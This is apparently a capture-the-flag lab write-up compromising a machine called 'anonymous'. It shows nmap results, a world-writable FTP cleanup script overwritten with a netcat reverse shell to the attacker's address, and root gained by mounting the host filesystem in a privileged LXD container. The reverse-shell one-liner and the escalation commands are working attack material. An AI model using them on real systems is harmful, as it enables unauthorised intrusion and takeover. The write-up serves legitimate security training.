

```
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.11.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-03-15T11:25:02+00:00
| smb2-time:
|   date: 2024-03-15T11:25:02
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -4s, deviation: 0s, median: -5s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.37 seconds

```




```
kali@kali ~> cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
kali@kali ~> cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
kali@kali ~> cat to_do.txt
I really need to disable the anonymous login...it's really not safe

```


so the most interesting thing is the clean.sh bash shell, we have read, write and execute privileges so i can probably over write it with a bash shell... what made me hesitate abit was being unsure if there is going to be a cronjob or not, of course there's no way to know other than to try


new payload 

```
kali@kali ~> cat clean.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.11.58 4444 >/tmp/f

```


# Privesc

Using method 1 we build an alpine image and then transport it there

## Step one, do this in host machine
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```


## Part 1.1 at victim side transporting the files


```
kali@kali ~/C/alpine> ls
alpine.yaml  incus.tar.xz  rootfs.squashfs

we need to transport incus.tar.xz and rootfs.squashfs
```


```
namelessone@anonymous:/tmp$ wget http://10.8.11.58:8002/rootfs.squashfs
wget http://10.8.11.58:8002/rootfs.squashfs
--2024-03-15 12:29:47--  http://10.8.11.58:8002/rootfs.squashfs
Connecting to 10.8.11.58:8002... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3084288 (2.9M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’
  3000K .......... ..                                         100%  939K=8.8s

2024-03-15 12:29:56 (341 KB/s) - ‘rootfs.squashfs’ saved [3084288/3084288]

```


```
namelessone@anonymous:/tmp$ wget http://10.8.11.58:8002/incus.tar.xz
wget http://10.8.11.58:8002/incus.tar.xz
--2024-03-15 12:29:11--  http://10.8.11.58:8002/incus.tar.xz
Connecting to 10.8.11.58:8002... connected.
HTTP request sent, awaiting response... 200 OK
Length: 884 [application/x-xz]
Saving to: ‘incus.tar.xz’

     0K                                                       100%  241K=0.004s

2024-03-15 12:29:12 (241 KB/s) - ‘incus.tar.xz’ saved [884/884]
```

Now that both files are saved we can go ahead and start exploitation


# Part 2 Privilege escalation

```
namelessone@anonymous:~$ lxd init
namelessone@anonymous:~$ cd /tmp
cd /tmp
namelessone@anonymous:/tmp$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine
< import incus.tar.xz rootfs.squashfs --alias alpine
Error: Image with same fingerprint already exists
namelessone@anonymous:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
namelessone@anonymous:/tmp$ lxc list
lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
namelessone@anonymous:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
namelessone@anonymous:/tmp$ lxc start privesc
namelessone@anonymous:/tmp$ lxc exec privesc /bin/sh
id
uid=0(root) gid=0(root)
cd /mnt/root
ls -la
total 4015204
drwxr-xr-x   24 root     root          4096 May 12  2020 .
drwxr-xr-x    1 root     root             8 Mar 15 12:32 ..
drwxr-xr-x    2 root     root          4096 May 13  2020 bin
drwxr-xr-x    3 root     root          4096 May 13  2020 boot
drwxr-xr-x    2 root     root          4096 May 11  2020 cdrom
drwxr-xr-x   17 root     root          3700 Mar 15 11:08 dev
drwxr-xr-x   96 root     root          4096 Jun  4  2020 etc
drwxr-xr-x    3 root     root          4096 May 11  2020 home
drwxr-xr-x   22 root     root          4096 May 11  2020 lib
drwxr-xr-x    2 root     root          4096 Feb  3  2020 lib64
drwx------    2 root     root         16384 May 11  2020 lost+found
drwxr-xr-x    2 root     root          4096 Feb  3  2020 media
drwxr-xr-x    2 root     root          4096 Feb  3  2020 mnt
drwxr-xr-x    2 root     root          4096 Feb  3  2020 opt
dr-xr-xr-x  161 root     root             0 Mar 15 11:07 proc
drwx------    6 root     root          4096 May 17  2020 root
drwxr-xr-x   28 root     root           920 Mar 15 12:32 run
drwxr-xr-x    2 root     root         12288 May 13  2020 sbin
drwxr-xr-x    4 root     root          4096 May 11  2020 snap
drwxr-xr-x    3 root     root          4096 May 14  2020 srv
-rw-------    1 root     root     4111466496 May 11  2020 swap.img
dr-xr-xr-x   13 root     root             0 Mar 15 11:40 sys
drwxrwxrwt    9 root     root          4096 Mar 15 12:33 tmp
drwxr-xr-x   10 root     root          4096 Feb  3  2020 usr
drwxr-xr-x   14 root     root          4096 May 13  2020 var
cd root
ls
root.txt
cat root.txt
4d.........................

```


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

I used method 1